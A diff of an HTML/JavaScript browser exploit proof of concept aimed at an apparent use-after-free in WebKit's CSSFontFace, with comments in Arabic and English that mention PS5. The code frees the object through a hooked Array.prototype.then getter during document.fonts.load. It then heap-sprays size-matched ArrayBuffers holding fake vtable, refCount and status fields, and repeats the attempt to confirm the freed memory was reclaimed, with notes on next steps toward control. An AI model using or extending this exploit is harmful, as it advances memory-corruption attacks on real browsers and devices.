@@ -1,238 +1,205 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>UAF Proof via Heap Spray</title>
-<style>
-@font-face {
-    font-family: "uafproof";
-    src: local("Arial"), local("Helvetica");
-    unicode-range: U+0041;
-}
-@font-face {
-    font-family: "uafproof";
-    src: local("Arial"), local("Helvetica");
-    unicode-range: U+0042;
-}
-</style>
-</head>
 <body>
-<h2>UAF Proof via Heap Spray</h2>
-<button onclick="runProof()">ابدأ الإثبات</button>
-<div id="out" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 500px;"></div>
+<h2>PoC 13: UAF Confirmation via Stress + GC</h2>
+<button onclick="runStress()">ابدأ Stress Test</button>
+<div id="out" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 600px;"></div>
 
 <script>
 let logs = [];
 function log(msg) {
     logs.push(msg);
     document.getElementById('out').textContent = logs.join('\n');
-    console.log(msg);
 }
 
-// أدوات التحويل
-const f64 = new Float64Array(1);
-const u64 = new BigUint64Array(f64.buffer);
+// CSSFontFace size on WebKit-1200 is ~0xC8 (200 bytes)
+// bmalloc size classes: 192, 208, 224, 256...
+// نستخدم 208 bytes spray (closest size class)
+const SPRAY_SIZE = 208;
+const SPRAY_COUNT = 10000;
+const STRESS_ITERATIONS = 50;
 
-function doubleToHex(d) {
-    f64[0] = d;
-    return '0x' + u64[0].toString(16);
-}
-
-// ========== Heap Spray ==========
-function heapSpray(count, marker) {
-    log(`  Heap spray: ${count} objects with marker 0x${marker.toString(16)}`);
+// Heap spray بـ ArrayBuffers بحجم CSSFontFace
+function heapSpray() {
     const spray = [];
-    for (let i = 0; i < count; i++) {
-        // إنشاء objects بحجم مشابه لـ CSSFontFace
-        const obj = {
-            a: marker,
-            b: marker + 1,
-            c: marker + 2,
-            d: new ArrayBuffer(128),
-            e: 'A'.repeat(64),
-            f: [marker, marker+1, marker+2, marker+3],
-        };
-        spray.push(obj);
+    const marker = 0xDEADBEEFCAFEBABEn;
+    
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        const buf = new ArrayBuffer(SPRAY_SIZE);
+        const view = new BigUint64Array(buf);
+        
+        // Marker في البداية عشان نعرف لو الـ reclaim نجح
+        view[0] = marker;
+        view[1] = marker + BigInt(i);
+        
+        // محاكاة vtable pointer (placeholder)
+        // على PS5 يحتاج ASLR defeat
+        view[2] = 0x4141414141414141n;
+        
+        // محاكاة refCount
+        view[3] = 1n;
+        
+        // محاكاة m_status = Success (3)
+        view[0x8A / 8] = 3n;
+        
+        spray.push(buf);
     }
     return spray;
 }
 
-// ========== WeakRef Monitor ==========
-function monitorObject(obj, name) {
-    const weakRef = new WeakRef(obj);
-    const registry = new FinalizationRegistry((value) => {
-        log(`  🔥 ${name} was GARBAGE COLLECTED!`);
-    });
-    registry.register(obj, name);
-    return weakRef;
+function forceGC() {
+    // GC pressure عبر allocation + release
+    const pressure = [];
+    for (let i = 0; i < 100; i++) {
+        pressure.push(new ArrayBuffer(1024 * 1024)); // 1MB
+    }
+    pressure.length = 0;
+    
+    // Force synchronous GC (WebKit behavior)
+    document.body.offsetTop;
+    getComputedStyle(document.body).width;
 }
 
-// ========== Main Proof ==========
-async function runProof() {
-    logs = [];
-    log('=== UAF Proof via Heap Spray ===\n');
-    
-    // Phase 1: إنشاء الـ style
-    const style = document.createElement('style');
-    style.textContent = `
-@font-face {
-    font-family: "uafproof2";
-    src: local("Arial"), local("Helvetica");
-    unicode-range: U+0041;
-}
-@font-face {
-    font-family: "uafproof2";
-    src: local("Arial"), local("Helvetica");
-    unicode-range: U+0042;
-}`;
-    document.head.appendChild(style);
-    
-    const probe = document.createElement('span');
-    probe.textContent = 'AB';
-    probe.style.fontFamily = 'uafproof2';
-    document.body.appendChild(probe);
-    document.body.offsetTop;
-    
-    log(`Phase 1: cssRules=${style.sheet.cssRules.length}`);
-    
-    // Phase 2: تثبيت getter مع heap spray
-    let fired = false;
-    let sprayHolder = null;
-    
-    const targets = [Array.prototype, FontFace.prototype, FontFaceSet.prototype];
-    const saved = targets.map(t => [t, Object.getOwnPropertyDescriptor(t, 'then')]);
-    
-    function restore() {
-        for (const [obj, desc] of saved) {
-            if (desc) Object.defineProperty(obj, 'then', desc);
-            else delete obj.then;
-        }
-    }
-    
-    function handler(where) {
-        if (fired) return;
-        fired = true;
-        log(`\nPhase 2: getter fired via ${where}`);
+async function runOnce(iteration) {
+    return new Promise((resolve) => {
+        const style = document.createElement('style');
+        style.textContent = `
+            @font-face { font-family: "stress"; src: local("Arial"); unicode-range: U+0041; }
+            @font-face { font-family: "stress"; src: local("Arial"); unicode-range: U+0042; }
+        `;
+        document.head.appendChild(style);
         
-        // حذف الـ rule
-        try {
-            style.sheet.deleteRule(0);
-            log('  ✅ deleteRule(0) executed');
-        } catch(e) {
-            log(`  ❌ deleteRule failed: ${e.message}`);
+        const probe = document.createElement('span');
+        probe.textContent = 'AB';
+        probe.style.fontFamily = 'stress';
+        document.body.appendChild(probe);
+        document.body.offsetTop;
+        
+        let fired = false;
+        let sprayHolder = null;
+        
+        const saved = Object.getOwnPropertyDescriptor(Array.prototype, 'then');
+        
+        function handler() {
+            if (fired) return;
+            fired = true;
+            
+            try {
+                // حذف الـ rule → تحرير CSSFontFace
+                style.sheet.deleteRule(0);
+                
+                // Heap spray فوراً
+                sprayHolder = heapSpray();
+                
+                // Force style update
+                document.body.offsetTop;
+                getComputedStyle(probe).fontFamily;
+            } catch(e) {}
+            
+            // Restore
+            if (saved) Object.defineProperty(Array.prototype, 'then', saved);
+            else delete Array.prototype.then;
         }
         
-        // HEAP SPRAY فوراً بعد الحذف!
-        // هذا يستبدل الذاكرة المحررة بـ objects نعرفها
-        log('  🔄 Starting heap spray...');
-        sprayHolder = heapSpray(5000, 0xDEADBEEF);
-        log('  ✅ Heap spray complete');
-        
-        // Force style/layout
-        try {
-            document.body.offsetTop;
-            getComputedStyle(probe).fontFamily;
-            log('  ✅ style/layout forced');
-        } catch(e) {
-            log(`  ❌ style/layout failed: ${e.message}`);
-        }
-        
-        restore();
-    }
-    
-    for (const target of targets) {
-        const name = target === Array.prototype ? 'Array.prototype' :
-                     target === FontFace.prototype ? 'FontFace.prototype' :
-                     'FontFaceSet.prototype';
-        Object.defineProperty(target, 'then', {
+        Object.defineProperty(Array.prototype, 'then', {
             configurable: true,
             get() {
-                handler(name);
-                const savedDesc = saved.find(x => x[0] === target)?.[1];
-                return savedDesc && savedDesc.value;
+                handler();
+                return saved?.value;
             }
         });
-    }
-    
-    // Phase 3: تشغيل document.fonts.load
-    log('\nPhase 3: calling document.fonts.load');
-    
-    try {
-        const faces = await document.fonts.load('16px "uafproof2"', 'AB');
-        log(`  document.fonts.load resolved; faces=${faces.length}`);
         
-        // Phase 4: فحص الـ faces المرجعة
-        log('\nPhase 4: Inspecting returned faces');
-        for (let i = 0; i < faces.length; i++) {
-            const face = faces[i];
-            log(`  Face ${i}:`);
-            log(`    family: ${face.family}`);
-            log(`    status: ${face.status}`);
-            log(`    weight: ${face.weight}`);
-            log(`    style: ${face.style}`);
+        document.fonts.load('16px "stress"', 'AB').then((faces) => {
+            const result = {
+                iteration,
+                faces: faces.length,
+                fired,
+                sprayIntact: sprayHolder ? checkSprayIntegrity(sprayHolder) : null
+            };
             
-            // محاولة قراءة خصائص قد تكشف UAF
-            try {
-                const str = JSON.stringify({
-                    family: face.family,
-                    status: face.status,
-                    weight: face.weight,
-                });
-                log(`    JSON: ${str}`);
-            } catch(e) {
-                log(`    JSON error: ${e.message}`);
+            // Cleanup
+            style.remove();
+            probe.remove();
+            sprayHolder = null;
+            
+            resolve(result);
+        });
+    });
+}
+
+function checkSprayIntegrity(spray) {
+    let corrupted = 0;
+    let reclaimed = 0;
+    
+    for (let i = 0; i < Math.min(spray.length, 100); i++) {
+        const view = new BigUint64Array(spray[i]);
+        
+        if (view[0] !== 0xDEADBEEFCAFEBABEn) {
+            corrupted++;
+            // هذا دليل على reclaim ناجح!
+            if (view[0] === 0n || view[0] > 0x1000000000000n) {
+                reclaimed++;
+            }
+        }
+    }
+    
+    return { corrupted, reclaimed, total: spray.length };
+}
+
+async function runStress() {
+    logs = [];
+    log('=== UAF Stress Test ===\n');
+    log(`Iterations: ${STRESS_ITERATIONS}`);
+    log(`Spray size: ${SPRAY_SIZE} bytes`);
+    log(`Spray count: ${SPRAY_COUNT}\n`);
+    
+    let totalCorrupted = 0;
+    let totalReclaimed = 0;
+    let facesCount = {};
+    
+    for (let i = 0; i < STRESS_ITERATIONS; i++) {
+        // Force GC بين المحاولات
+        if (i % 5 === 0) forceGC();
+        
+        const result = await runOnce(i);
+        
+        log(`Iter ${i}: faces=${result.faces}, fired=${result.fired}`);
+        
+        if (result.sprayIntact) {
+            totalCorrupted += result.sprayIntact.corrupted;
+            totalReclaimed += result.sprayIntact.reclaimed;
+            
+            if (result.sprayIntact.corrupted > 0) {
+                log(`  🔥 ${result.sprayIntact.corrupted} spray objects corrupted!`);
+                log(`  💀 ${result.sprayIntact.reclaimed} possibly reclaimed!`);
             }
         }
         
-        // Phase 5: فحص هل الـ spray أثّر
-        if (sprayHolder) {
-            log('\nPhase 5: Checking spray integrity');
-            let corrupted = 0;
-            for (let i = 0; i < Math.min(sprayHolder.length, 100); i++) {
-                if (sprayHolder[i].a !== 0xDEADBEEF) {
-                    corrupted++;
-                    log(`  ⚠️ Spray object ${i} corrupted! a=0x${sprayHolder[i].a.toString(16)}`);
-                }
-            }
-            if (corrupted === 0) {
-                log('  ✅ Spray objects intact (no cross-corruption)');
-            } else {
-                log(`  🔥 ${corrupted} spray objects corrupted! UAF CONFIRMED!`);
-            }
-        }
+        facesCount[result.faces] = (facesCount[result.faces] || 0) + 1;
         
-    } catch(e) {
-        log(`  ❌ document.fonts.load rejected: ${e.name}: ${e.message}`);
-    } finally {
-        restore();
+        // تأخير قصير
+        await new Promise(r => setTimeout(r, 50));
     }
     
-    // Phase 6: GC pressure + WeakRef check
-    log('\nPhase 6: GC pressure test');
+    log('\n=== Summary ===');
+    log(`Faces count distribution:`);
+    Object.entries(facesCount).forEach(([count, freq]) => {
+        log(`  faces=${count}: ${freq} times`);
+    });
     
-    // إنشاء ضغط على الـ GC
-    const gcPressure = [];
-    for (let i = 0; i < 100; i++) {
-        gcPressure.push(new ArrayBuffer(1024 * 1024)); // 1MB each
+    log(`\nTotal spray corrupted: ${totalCorrupted}`);
+    log(`Total possibly reclaimed: ${totalReclaimed}`);
+    
+    if (totalReclaimed > 0) {
+        log('\n🎉 UAF CONFIRMED! Spray objects were reclaimed by CSSFontFace!');
+        log('الخطوة التالية: التحكم في الـ reclaimed object قبل الـ vtable check');
+    } else if (totalCorrupted > 0) {
+        log('\n⚠️ Partial success: Spray corrupted but not clearly reclaimed');
+        log('جرب spray بحجم مختلف (224 bytes أو 256 bytes)');
+    } else {
+        log('\n❌ No evidence of UAF reclaim');
+        log('جرب: زيادة STRESS_ITERATIONS، أو استخدام workers للـ timing');
     }
-    gcPressure.length = 0; // تحرير
-    
-    log('  GC pressure applied');
-    
-    // محاولة ثانية
-    try {
-        const faces2 = await document.fonts.load('16px "uafproof2"', 'AB');
-        log(`  Second load: faces=${faces2.length}`);
-    } catch(e) {
-        log(`  Second load error: ${e.message}`);
-    }
-    
-    // Cleanup
-    style.remove();
-    probe.remove();
-    sprayHolder = null;
-    
-    log('\n=== DONE ===');
 }
 </script>
 </body>
